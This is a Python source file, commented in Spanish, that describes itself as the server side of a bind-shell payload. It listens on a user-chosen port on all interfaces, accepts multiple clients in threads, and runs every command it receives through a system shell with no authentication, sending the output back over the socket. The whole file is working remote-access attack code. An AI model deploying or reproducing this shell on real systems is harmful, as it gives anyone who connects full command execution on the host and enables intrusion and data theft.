from os import name
import subprocess # * Permite redirigir flujos
import threading
import socket
import sys
import os

# ! Este código presenta el lado del servidor de un shellcode de tipo bind, es esencialmente el payload

# * Mandamos el fin de comando (capa 7)
FIN_COMANDO = b'#00#'

def ejecutar_comando(comando):
    """
    ! Esta función ejecuta el comando y regresa la salida de forma binaria
    ! Comando viene como cadena binaria
    """
    comando = comando.decode('UTF-8')
    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    salida, error = proc.communicate() # ! Si la variable 'error', está vacía no hay error
    if error: 
        return False
    return salida # * Formato Binario

def leer_comando(cliente):
    # ! Lee el canal de comunicación del cliente y reconstruye el comando asociado
    comando = cliente.recv(2048)
    while not comando.endswith(FIN_COMANDO):
        comando += cliente.recv(2048)
    # ! Para saber cuando termina el comando
    quitar_caracteres = len(FIN_COMANDO)
    return comando[:-quitar_caracteres]

def mandar_mensaje(mensaje, socket):
    # ! Envia un mensaje a través del socket establecido
    # ! El mensaje debe ser una cadena binaria
    mensaje += FIN_COMANDO
    socket.send(mensaje)

# * Extraer ruta del cd
def extraer_ruta_cd(comando):
    """
    ! Exclusivo para parsear el comando cd
    ! Regresamos la ruta
    """
    partes = comando.split(b' ')
    if len(partes) != 2: # ! Error
        return False
    return partes[1]
 
def atender_cliente(cliente):
    # ! Genera hilos en base al num de clientes
    # * El servidor queda a la espera de un comando
    print(cliente)
    comando = ''
    while comando != b'exit':
        comando = leer_comando(cliente) # * A la espera de mensajes
        if comando.startswith(b'cd'):
            ruta = extraer_ruta_cd(comando)
            if ruta == False:
                salida = False
            else: 
                salida = ejecutar_cd(ruta)        
        else:
            salida = ejecutar_comando(comando)
        if salida == False:
            mandar_mensaje(b'El comando anterior fallo', cliente)
        else:
            mandar_mensaje(salida, cliente) 
    cliente.close()

# * Ejecutar CD
def ejecutar_cd(ruta):
    try:
        os.chdir(ruta)
        return b'Change Directory'
    except FileNotFoundError:
        return False

def inicializar_servidor(puerto):
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('', int(puerto))) # * Asociamos desde cualquier interfaz de red
    servidor.listen(5) # * Peticiones simultaneas
    # ! Nuevo hilo que espere comandos, funcion externa, implementacion reverse
    while True:
        cliente, addr = servidor.accept() # ! Mientras no tengamos clientes, el hilo de ejecucion esta bloqueado
        hilo = threading.Thread(target=atender_cliente, args=(cliente, ))
        hilo.start()

## TODO: Main ## 
if __name__ == '__main__':
    puerto = sys.argv[1] # * Pasamos el parámetro
    inicializar_servidor(puerto)